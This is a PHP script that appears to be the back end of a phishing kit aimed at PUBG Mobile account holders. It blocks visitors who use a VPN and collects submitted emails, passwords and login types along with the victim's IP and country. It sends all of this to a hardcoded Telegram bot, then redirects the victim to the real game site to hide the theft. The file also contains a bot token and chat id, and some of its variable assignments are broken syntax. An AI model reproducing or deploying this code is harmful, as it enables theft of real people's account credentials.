<?php
error_reporting(0);

session_start();
if(array_key_exists("last_access", $_SESSION) && time()-3 <= $_SESSION["last_access"]) {
  exit('You are refreshing too quickly, please wait a few seconds and try again');
}
$_SESSION["last_access"] = time(); 

function getUserIP(){
if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
          $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
          $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];

if(filter_var($client, FILTER_VALIDATE_IP)){
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $ip = $forward;
}else{
    $ip = $remote;
}
return $ip;
}
 $ip = getUserIP();

$api = json_decode(file_get_contents("https://api.dlyar-dev.tk/whois?ip=".$ip),1);

$flag = $api["flag"];
$ccode = $api["code"];
$country = $api["country-ar"];
$cvpn = $api["check-vpn"];
if($cvpn == true){
exit("Why you Enable vpn?");
}

include("storage.php");
$token = $5702986967:AAEX2BkeZWWY_Lt5AUsAHEkmQtVzGrzAfIg;
$id = $1816279917;
$name_index = "Mostafa";
$name_tele = "@kkvbn";
$link = "https://pubgmobile.com";





$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$time = date("h:i:a");
$date = date("Y/m/d");


if($email && $password && $login && $cvpn == false){
$msg = "
ᯓ ʜɪ ᴘʀᴏ ʏᴏᴜ ɢᴇᴛ ɴᴇᴡ ᴀᴄᴄ
━━━━━━━━━━━━━━━━━
ᯓ 𝙽𝙰𝙼𝙴-𝙸𝙽𝙳𝙴𝚇 » *$name_index*
ᯓ ʟᴏɢɪɴ » #$login
ᯓ ᴇᴍᴀɪʟ » `$email`
ᯓ ᴘᴀssᴡᴏʀᴅ » `$password`
ᯓ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ » *$flag* `$ccode`
ᯓ ᴄᴏᴜɴᴛʀʏ ɴᴀᴍᴇ » *$country*
ᯓ ɪᴘ » *$ip*
ᯓ ᴅᴀᴛᴇ » *$date*
━━━━━━━━━━━━━━━━━
ᯓ ʙʏ » [$name_tele](tg://user?id=$id)
";
$mesg = http_build_query([
'chat_id'=>$id,
'text'=>$msg,
'parse_mode'=>"markdown",
'disable_web_page_preview'=>true
]);

file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".$mesg);
header("Location: ".$link);
}